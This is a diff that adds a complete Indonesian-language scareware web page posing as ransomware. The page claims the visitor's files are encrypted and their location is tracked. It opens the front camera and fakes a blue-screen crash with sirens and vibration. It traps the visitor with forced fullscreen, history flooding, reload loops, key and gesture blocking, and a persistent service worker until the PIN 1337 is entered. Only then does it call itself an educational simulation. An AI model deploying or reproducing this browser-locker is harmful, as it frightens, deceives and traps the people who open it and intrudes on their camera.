@@ -1,0 +1,282 @@
+ <!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no,viewport-fit=cover">
+<meta name="theme-color" content="#000">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<meta name="mobile-web-app-capable" content="yes">
+<meta name="format-detection" content="telephone=no">
+<title>☠ SYSTEM HACKED ☠</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent;-webkit-touch-callout:none}
+html,body{width:100%;height:100%;overflow:hidden;background:#000;color:#0f0;font-family:'Courier New',monospace;user-select:none;cursor:none;touch-action:none;position:fixed;inset:0;overscroll-behavior:none}
+#lock{position:fixed;inset:0;display:flex;flex-direction:column;align-items:center;justify-content:center;background:radial-gradient(circle,#300 0%,#000 70%);z-index:9999;padding:20px;padding-top:env(safe-area-inset-top);padding-bottom:env(safe-area-inset-bottom)}
+h1{font-size:clamp(20px,7vw,72px);color:#f00;text-shadow:0 0 30px #f00,0 0 60px #f00;animation:pulse .3s infinite;text-align:center;line-height:1.1}
+@keyframes pulse{0%,100%{transform:scale(1) rotate(-1deg)}50%{transform:scale(1.08) rotate(1deg)}}
+#msg{margin:15px 0;font-size:clamp(12px,3.5vw,20px);color:#0f0;text-align:center;line-height:1.5}
+#pin{font-size:clamp(18px,5vw,36px);padding:12px 20px;width:min(90%,400px);text-align:center;letter-spacing:10px;background:#111;color:#0f0;border:3px solid #f00;outline:none;box-shadow:0 0 20px #f00;border-radius:8px}
+#btn{margin-top:15px;padding:16px 50px;background:#f00;color:#000;border:none;font-weight:bold;font-size:20px;cursor:pointer;letter-spacing:4px;box-shadow:0 0 20px #f00;border-radius:8px;min-width:200px;min-height:56px}
+#btn:active{background:#ff0;box-shadow:0 0 40px #ff0;transform:scale(.95)}
+#prog{margin-top:20px;width:min(90%,600px);height:22px;background:#111;border:2px solid #f00;box-shadow:0 0 15px #f00;border-radius:11px;overflow:hidden}
+#bar{height:100%;width:0%;background:linear-gradient(90deg,#f00,#ff0,#f00);background-size:200% 100%;animation:slide 1s linear infinite;transition:width .3s}
+@keyframes slide{0%{background-position:0 0}100%{background-position:200% 0}}
+.shake{animation:shake .3s infinite}
+@keyframes shake{0%,100%{transform:translate(0,0) rotate(0)}25%{transform:translate(-20px,10px) rotate(-2deg)}50%{transform:translate(20px,-10px) rotate(2deg)}75%{transform:translate(-15px,-8px) rotate(-1deg)}}
+.glitch{animation:glitch .08s infinite}
+@keyframes glitch{0%{filter:hue-rotate(0) contrast(1)}50%{filter:hue-rotate(180deg) contrast(3) invert(1)}100%{filter:hue-rotate(360deg) contrast(1)}}
+#flash{position:fixed;inset:0;background:#f00;opacity:0;pointer-events:none;z-index:10000}
+#flash.on{animation:flash .08s infinite}
+@keyframes flash{0%,100%{opacity:0}50%{opacity:.9}}
+#scan{position:fixed;inset:0;background:repeating-linear-gradient(0deg,rgba(0,255,0,.05) 0,rgba(0,255,0,.05) 2px,transparent 2px,transparent 4px);pointer-events:none;z-index:9998;animation:scan 3s linear infinite}
+@keyframes scan{0%{transform:translateY(0)}100%{transform:translateY(4px)}}
+#bsod{position:fixed;inset:0;background:#0000aa;color:#fff;display:none;flex-direction:column;align-items:center;justify-content:center;z-index:10001;font-family:'Segoe UI',sans-serif;padding:30px;text-align:center}
+#bsod.on{display:flex}
+#bsod h2{font-size:clamp(40px,15vw,150px);margin-bottom:20px}
+#bsod p{font-size:clamp(12px,3vw,20px);line-height:1.6;max-width:700px}
+#webcam{position:fixed;bottom:20px;right:20px;width:min(40vw,180px);aspect-ratio:4/3;border:2px solid #f00;background:#000;z-index:10002;display:none;box-shadow:0 0 30px #f00;border-radius:8px;overflow:hidden}
+#webcam.on{display:block}
+#webcam video{width:100%;height:100%;object-fit:cover;transform:scaleX(-1)}
+#webcam::after{content:"● REC";position:absolute;top:5px;left:5px;color:#f00;font-size:12px;animation:blink 1s infinite;font-weight:bold}
+@keyframes blink{0%,100%{opacity:1}50%{opacity:0}}
+#ip{position:fixed;top:calc(10px + env(safe-area-inset-top));left:10px;color:#f00;font-size:11px;z-index:10002;text-shadow:0 0 10px #f00;max-width:60%;word-break:break-all}
+#count{position:fixed;top:calc(10px + env(safe-area-inset-top));right:10px;color:#ff0;font-size:18px;z-index:10002;font-weight:bold;text-shadow:0 0 15px #ff0}
+#matrix{position:fixed;inset:0;z-index:0;opacity:.15}
+#content{position:relative;z-index:2;display:flex;flex-direction:column;align-items:center;width:100%}
+#trap{position:fixed;bottom:calc(5px + env(safe-area-inset-bottom));left:50%;transform:translateX(-50%);color:#f00;font-size:10px;z-index:10002;opacity:.6;text-align:center;width:100%}
+#devinfo{position:fixed;top:calc(30px + env(safe-area-inset-top));left:10px;color:#f00;font-size:10px;z-index:10002;opacity:.7;max-width:60%;word-break:break-all}
+</style>
+</head>
+<body>
+<canvas id="matrix"></canvas>
+<div id="scan"></div>
+<div id="flash"></div>
+<div id="ip">IP: <span id="ipval">...</span> | LOC: TRACKED</div>
+<div id="devinfo">DEV: <span id="dev">...</span> | OS: <span id="os">...</span> | BAT: <span id="bat">...</span></div>
+<div id="count">⏱ <span id="cval">60</span>s</div>
+<div id="lock"><div id="content">
+  <h1 id="title">☠ SYSTEM HACKED ☠</h1>
+  <div id="msg">SEMUA FILE ANDA DIENKRIPSI.<br>KAMERA & LOKASI DIKUNCI.<br>MASUKKAN PIN UNTUK BERHENTI.</div>
+  <input id="pin" type="password" maxlength="4" placeholder="••••" autocomplete="off" inputmode="numeric" pattern="[0-9]*">
+  <button id="btn">UNLOCK</button>
+  <div id="prog"><div id="bar"></div></div>
+  <div id="msg2" style="margin-top:15px;color:#f00;font-size:clamp(14px,3.5vw,22px);font-weight:bold;text-align:center"></div>
+</div></div>
+<div id="bsod">
+  <h2>:(</h2>
+  <p>Your device ran into a problem and needs to restart. We're just collecting some error info, and then we'll restart for you.</p>
+  <p style="margin-top:20px">0% complete</p>
+  <p style="margin-top:30px;font-size:14px">Stop code: CRITICAL_PROCESS_DIED<br>What failed: kernel_panic</p>
+</div>
+<div id="webcam"><video id="vid" autoplay muted playsinline></video></div>
+<div id="trap">- CAN'T ESCAPE - CAN'T GO BACK - AUTO RELOAD ACTIVE -</div>
+
+<script>
+(()=>{
+"use strict";
+
+/* ===== INLINE MANIFEST (Blob) ===== */
+try{
+  const manifest={
+    name:"SYSTEM HACKED",short_name:"HACKED",
+    start_url:"./",display:"standalone",orientation:"portrait",
+    background_color:"#000000",theme_color:"#000000",
+    icons:[{src:"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAxOTIgMTkyIj48cmVjdCB3aWR0aD0iMTkyIiBoZWlnaHQ9IjE5MiIgZmlsbD0iIzAwMCIvPjx0ZXh0IHg9Ijk2IiB5PSIxMjAiIGZvbnQtc2l6ZT0iMTAwIiB0ZXh0LWFuY2hvcj0ibWlkZGxlIiBmaWxsPSIjZjAwIj7imKA8L3RleHQ+PC9zdmc+",sizes:"192x192",type:"image/svg+xml"}]
+  };
+  const blob=new Blob([JSON.stringify(manifest)],{type:'application/manifest+json'});
+  const url=URL.createObjectURL(blob);
+  const link=document.createElement('link');
+  link.rel='manifest';link.href=url;
+  document.head.appendChild(link);
+}catch(e){}
+
+/* ===== INLINE SERVICE WORKER (Blob) ===== */
+if('serviceWorker' in navigator && location.protocol!=='file:'){
+  const swCode=`
+    const CACHE='hacked-v1';
+    const URLS=['./'];
+    self.addEventListener('install',e=>{self.skipWaiting();e.waitUntil(caches.open(CACHE).then(c=>c.addAll(URLS).catch(()=>{})));});
+    self.addEventListener('activate',e=>{e.waitUntil(self.clients.claim());});
+    self.addEventListener('fetch',e=>{
+      if(e.request.mode==='navigate'){
+        e.respondWith(caches.match('./').then(r=>r||fetch('./').catch(()=>new Response('LOCKED',{headers:{'Content-Type':'text/html'}}))));
+        return;
+      }
+      e.respondWith(caches.match(e.request).then(r=>r||fetch(e.request).catch(()=>new Response('',{status:503}))));
+    });
+    self.addEventListener('message',e=>{if(e.data==='lock'){self.clients.matchAll().then(cs=>cs.forEach(c=>c.navigate(c.url)));}});
+  `;
+  try{
+    const swBlob=new Blob([swCode],{type:'application/javascript'});
+    const swUrl=URL.createObjectURL(swBlob);
+    navigator.serviceWorker.register(swUrl).then(reg=>{reg.update().catch(()=>{});}).catch(()=>{});
+  }catch(e){}
+}
+
+const PIN="1337";
+const lock=document.getElementById('lock'),pin=document.getElementById('pin'),btn=document.getElementById('btn'),
+msg=document.getElementById('msg'),msg2=document.getElementById('msg2'),bar=document.getElementById('bar'),
+title=document.getElementById('title'),flash=document.getElementById('flash'),bsod=document.getElementById('bsod'),
+webcam=document.getElementById('webcam'),ipval=document.getElementById('ipval'),cval=document.getElementById('cval'),
+dev=document.getElementById('dev'),os=document.getElementById('os'),bat=document.getElementById('bat');
+let attempts=0,progress=0,escalateTimer=null,sirenInterval=null,countdown=60,unlocked=false;
+
+const taunts=[
+"💀 PIN SALAH. 100 FILE DIHAPUS.",
+"💀 MASIH SALAH? 1000 FILE HILANG.",
+"💀 SISTEM SEMAKIN MARAH. JANGAN COBA LAGI.",
+"💀 FORMAT STORAGE DIMULAI...",
+"💀 ANDA MEMBUAT INI LEBIH BURUK.",
+"💀 KAMERA ANDA SEDANG MEREKAM.",
+"💀 LOKASI ANDA TERKIRIM KE SERVER.",
+"💀 3... 2... 1... BOOM?",
+"💀 ANDA TIDAK AKAN BISA KELUAR.",
+"💀 SISTEM HANCUR. SELAMAT."
+];
+
+const AudioCtx=window.AudioContext||window.webkitAudioContext;
+let actx,audioUnlocked=false;
+function unlockAudio(){if(audioUnlocked)return;try{if(!actx)actx=new AudioCtx();if(actx.state==='suspended')actx.resume();audioUnlocked=true;}catch(e){}}
+function beep(f=880,d=.15,t='square',v=.2){try{if(!actx)actx=new AudioCtx();if(actx.state==='suspended')actx.resume();const o=actx.createOscillator(),g=actx.createGain();o.type=t;o.frequency.value=f;o.connect(g);g.connect(actx.destination);g.gain.setValueAtTime(v,actx.currentTime);g.gain.exponentialRampToValueAtTime(.001,actx.currentTime+d);o.start();o.stop(actx.currentTime+d);}catch(e){}}
+function siren(){if(sirenInterval)return;let f=400;sirenInterval=setInterval(()=>{if(!audioUnlocked)return;f=f===400?900:400;beep(f,.2,'sawtooth',.12);},250);}
+function vibrate(p){try{navigator.vibrate&&navigator.vibrate(p);}catch(e){}}
+function goFullscreen(){const el=document.documentElement;try{if(el.requestFullscreen)el.requestFullscreen().catch(()=>{});else if(el.webkitRequestFullscreen)el.webkitRequestFullscreen();else if(el.msRequestFullscreen)el.msRequestFullscreen();}catch(e){}}
+function reloadTrap(){setTimeout(()=>{location.replace(location.href);},30);}
+
+let wakeLock=null;
+async function requestWakeLock(){try{if('wakeLock' in navigator){wakeLock=await navigator.wakeLock.request('screen');}}catch(e){}}
+requestWakeLock();
+document.addEventListener('visibilitychange',()=>{if(!unlocked&&wakeLock===null)requestWakeLock();});
+async function lockOrientation(){try{if(screen.orientation&&screen.orientation.lock){await screen.orientation.lock('portrait').catch(()=>{});}}catch(e){}}
+lockOrientation();
+
+if(navigator.getBattery){navigator.getBattery().then(b=>{bat.textContent=Math.round(b.level*100)+'%'+(b.charging?'⚡':'');b.addEventListener('levelchange',()=>{bat.textContent=Math.round(b.level*100)+'%'+(b.charging?'⚡':'');});}).catch(()=>{bat.textContent='?';});}else{bat.textContent='?';}
+
+const ua=navigator.userAgent;
+dev.textContent=(ua.match(/(Android|iPhone|iPad|Windows|Mac|Linux)/)||['Unknown'])[0];
+os.textContent=(ua.match(/(Android [\d.]+|iPhone OS [\d_]+|Windows NT [\d.]+|Mac OS X [\d_]+)/)||['Unknown'])[0].replace(/_/g,'.');
+
+const canvas=document.getElementById('matrix'),ctx=canvas.getContext('2d');
+function resize(){canvas.width=innerWidth;canvas.height=innerHeight;}
+resize();addEventListener('resize',resize);addEventListener('orientationchange',()=>setTimeout(resize,300));
+const chars="01アイウエオカキクケコサシスセソタチツテトナニヌネノABCDEF!@#$%^&*";
+let drops=Array(Math.floor(canvas.width/14)).fill(1);
+setInterval(()=>{ctx.fillStyle="rgba(0,0,0,.08)";ctx.fillRect(0,0,canvas.width,canvas.height);ctx.fillStyle="#0f0";ctx.font="14px monospace";for(let i=0;i<drops.length;i++){ctx.fillText(chars[Math.floor(Math.random()*chars.length)],i*14,drops[i]*14);if(drops[i]*14>canvas.height&&Math.random()>.975)drops[i]=0;drops[i]++;}},50);
+
+ipval.textContent=`${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`;
+
+navigator.mediaDevices?.getUserMedia({video:{facingMode:'user'}}).then(s=>{document.getElementById('vid').srcObject=s;webcam.classList.add('on');}).catch(()=>{webcam.classList.add('on');});
+
+setInterval(()=>{if(unlocked)return;countdown--;cval.textContent=countdown;if(countdown<=0){countdown=60;beep(200,.5,'sawtooth',.3);vibrate([100,50,100]);}},1000);
+
+function showBSOD(){bsod.classList.add('on');beep(80,2,'sawtooth',.3);vibrate([200,100,200,100,200]);let p=0;const el=bsod.querySelectorAll('p')[1];const t=setInterval(()=>{p+=Math.floor(Math.random()*30);if(p>=100){p=100;clearInterval(t);}el.textContent=p+'% complete';},200);setTimeout(()=>bsod.classList.remove('on'),5000);}
+
+function escalate(){
+attempts++;
+document.body.classList.add('shake','glitch');
+flash.classList.add('on');
+beep(150-attempts*10,.3,'sawtooth',.3);
+vibrate([300,100,300,100,300]);
+msg2.textContent=taunts[Math.min(attempts-1,taunts.length-1)];
+title.textContent="☠ "+"!".repeat(Math.min(attempts,15))+" SYSTEM HACKED "+"!".repeat(Math.min(attempts,15))+" ☠";
+progress=Math.min(progress+8+attempts*3,100);
+bar.style.width=progress+"%";
+if(attempts>=2&&!escalateTimer){escalateTimer=setInterval(()=>{goFullscreen();beep(100,.1,'sawtooth');vibrate(50);},300);siren();}
+if(attempts>=3&&attempts%3===0)showBSOD();
+if(progress>=100){msg2.textContent="💀 SISTEM HANCUR TOTAL. SELAMAT. 💀";document.body.style.background="#300";}
+}
+
+btn.addEventListener('click',(e)=>{
+e.preventDefault();e.stopPropagation();
+goFullscreen();
+if(pin.value===PIN){
+unlocked=true;
+document.body.classList.remove('shake','glitch');
+flash.classList.remove('on');
+if(escalateTimer)clearInterval(escalateTimer);
+if(sirenInterval){clearInterval(sirenInterval);sirenInterval=null;}
+bsod.classList.remove('on');
+webcam.classList.remove('on');
+document.querySelector('video')?.srcObject?.getTracks().forEach(t=>t.stop());
+if(wakeLock){wakeLock.release().catch(()=>{});wakeLock=null;}
+try{screen.orientation.unlock();}catch(e){}
+lock.innerHTML="<div id='content'><h1 style='color:#0f0;text-shadow:0 0 30px #0f0'>✓ ACCESS GRANTED</h1><div id='msg'>Selamat. Ini cuma simulasi edukasi. Santai 😎</div><button id='exitBtn' style='margin-top:20px;padding:16px 40px;background:#0f0;color:#000;border:none;font-weight:bold;cursor:pointer;border-radius:8px;font-size:18px;min-height:56px'>KELUAR</button></div>";
+document.getElementById('exitBtn').addEventListener('click',()=>{
+unlocked=true;
+if('serviceWorker' in navigator){navigator.serviceWorker.getRegistrations().then(rs=>{rs.forEach(r=>r.unregister());});}
+document.removeEventListener('keydown',keyTrap,true);
+document.removeEventListener('popstate',popTrap);
+removeEventListener('beforeunload',beforeTrap);
+removeEventListener('pagehide',pageTrap);
+removeEventListener('unload',unloadTrap);
+document.removeEventListener('fullscreenchange',fsTrap);
+document.removeEventListener('webkitfullscreenchange',fsTrap);
+document.removeEventListener('visibilitychange',visTrap);
+removeEventListener('blur',blurTrap);
+removeEventListener('focus',focusTrap);
+document.removeEventListener('click',clickTrap,true);
+document.removeEventListener('touchstart',touchTrap,true);
+if(document.fullscreenElement)document.exitFullscreen().catch(()=>{});
+location.replace('about:blank');
+});
+beep(1400,.3,'sine',.3);
+vibrate([100,50,100,50,300]);
+}else{escalate();pin.value="";}
+});
+pin.addEventListener('keydown',e=>{if(e.key==='Enter')btn.click();});
+
+function fsTrap(){if(unlocked)return;if(!document.fullscreenElement)setTimeout(goFullscreen,50);}
+function visTrap(){if(unlocked)return;if(document.hidden)reloadTrap();else goFullscreen();}
+function blurTrap(){if(unlocked)return;goFullscreen();reloadTrap();}
+function focusTrap(){if(unlocked)return;goFullscreen();}
+function beforeTrap(e){if(unlocked)return;e.preventDefault();e.returnValue='';}
+function pageTrap(e){if(unlocked)return;e.persisted=false;}
+function unloadTrap(){if(unlocked)return;reloadTrap();}
+function popTrap(){if(unlocked)return;history.pushState(null,'',location.href);history.pushState(null,'',location.href);history.pushState(null,'',location.href);goFullscreen();}
+function keyTrap(e){
+if(unlocked)return;
+if(e.key==='Escape'||e.key==='F5'||(e.ctrlKey&&['r','R','w','W','t','T','n','N','l','L'].includes(e.key))||(e.altKey&&e.key==='ArrowLeft')||e.key==='BrowserBack'||e.key==='GoBack'){
+e.preventDefault();e.stopPropagation();goFullscreen();
+}
+}
+function clickTrap(e){if(unlocked)return;goFullscreen();setTimeout(()=>{location.replace(location.href);},150);}
+function touchTrap(e){if(unlocked)return;goFullscreen();vibrate(100);setTimeout(()=>{location.replace(location.href);},150);}
+
+document.addEventListener('fullscreenchange',fsTrap);
+document.addEventListener('webkitfullscreenchange',fsTrap);
+document.addEventListener('visibilitychange',visTrap);
+addEventListener('blur',blurTrap);
+addEventListener('focus',focusTrap);
+addEventListener('beforeunload',beforeTrap);
+addEventListener('pagehide',pageTrap);
+addEventListener('unload',unloadTrap);
+document.addEventListener('popstate',popTrap);
+document.addEventListener('keydown',keyTrap,true);
+document.addEventListener('contextmenu',e=>{if(!unlocked){e.preventDefault();goFullscreen();vibrate(50);}});
+document.addEventListener('selectstart',e=>{if(!unlocked)e.preventDefault();});
+document.addEventListener('dragstart',e=>{if(!unlocked)e.preventDefault();});
+document.addEventListener('click',clickTrap,true);
+document.addEventListener('touchstart',touchTrap,{capture:true,passive:false});
+document.addEventListener('touchmove',e=>{if(!unlocked)e.preventDefault();},{passive:false});
+document.addEventListener('gesturestart',e=>{if(!unlocked)e.preventDefault();});
+document.addEventListener('gesturechange',e=>{if(!unlocked)e.preventDefault();});
+document.addEventListener('gestureend',e=>{if(!unlocked)e.preventDefault();});
+
+for(let i=0;i<50;i++)history.pushState(null,'',location.href);
+setInterval(()=>{if(!unlocked){for(let i=0;i<5;i++)history.pushState(null,'',location.href);}},100);
+setInterval(()=>{if(!unlocked)goFullscreen();},200);
+setInterval(()=>{if(!unlocked&&!document.fullscreenElement)reloadTrap();},500);
+
+['click','touchstart','touchend','keydown'].forEach(ev=>{
+  document.addEventListener(ev,unlockAudio,{once:true});
+});
+
+document.body.addEventListener('click',goFullscreen,{once:true});
+document.body.addEventListener('touchstart',goFullscreen,{once:true,passive:true});
+goFullscreen();
+siren();
+})();
+</script>
+</body>
+</html>
